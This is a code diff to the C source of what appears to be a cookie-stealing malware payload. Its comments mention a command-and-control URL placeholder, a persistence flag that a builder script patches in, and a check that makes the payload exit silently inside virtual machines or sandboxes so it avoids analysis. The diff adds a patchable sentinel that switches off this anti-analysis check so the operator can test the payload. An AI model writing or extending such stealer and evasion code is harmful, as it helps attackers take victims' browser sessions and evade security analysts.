@@ -72,6 +72,10 @@ static char g_c2_url[256] = "CKC2_DEADBEEF_";
 // pick.py/auto.py can find "CKPR____" in loader.exe and overwrite with "CKPR0001" to enable.
 static char g_persist[8] = {'C','K','P','R','_','_','_','_'};
 
+// Anti-VM skip sentinel: if replaced with "CKAV0001" (8 bytes), IsAnalysisEnv() is
+// skipped entirely. Use --no-anti-vm in auto.py to enable. Needed for testing on VMs.
+static char g_skip_av[8] = {'C','K','A','V','0','0','0','0'};
+
 // ------------------------------------------------------------------ JSON output buffer
 static char  g_out[2048*1024];
 static size_t g_len;
@@ -1107,6 +1111,11 @@ static bool Sink(void){
 // Returns true if the payload appears to be running in a VM or sandbox.
 // If so, the payload exits silently without extracting cookies.
 static bool IsAnalysisEnv(void){
+    // Check anti-VM skip sentinel (patched to "CKAV0001" by --no-anti-vm)
+    if(g_skip_av[4]=='0' && g_skip_av[5]=='0' && g_skip_av[6]=='0' && g_skip_av[7]=='1'){
+        Dbg("IsAnalysisEnv: SKIPPED (CKAV0001 — anti-VM disabled)");
+        return false;
+    }
     Dbg("IsAnalysisEnv: checking");
 
     // 1. Check for known VM MAC address prefixes on PHYSICAL adapters only.
